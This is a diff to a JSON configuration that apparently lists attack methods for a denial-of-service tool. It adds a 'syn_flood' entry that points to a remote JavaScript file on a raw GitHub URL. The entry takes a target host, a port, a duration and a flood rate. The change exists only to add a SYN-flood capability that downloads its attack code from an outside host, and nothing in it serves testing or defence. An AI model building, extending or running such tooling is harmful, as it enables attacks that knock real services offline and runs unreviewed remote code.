@@ -23,5 +23,14 @@
             "port": {"required": true, "type": "number"},
             "duration": {"required": false, "type": "number", "default": 10}
         }
+    },
+    "syn_flood": {
+        "url": "https://raw.githubusercontent.com/cassbethany10-afk/test123/refs/heads/main/syn_flood.js",
+        "params": {
+            "target": {"required": true, "type": "string"},
+            "port": {"required": true, "type": "number"},
+            "duration": {"required": false, "type": "number", "default": 10},
+            "rate": {"required": false, "type": "number", "default": 1000}
+        }
     }
 }
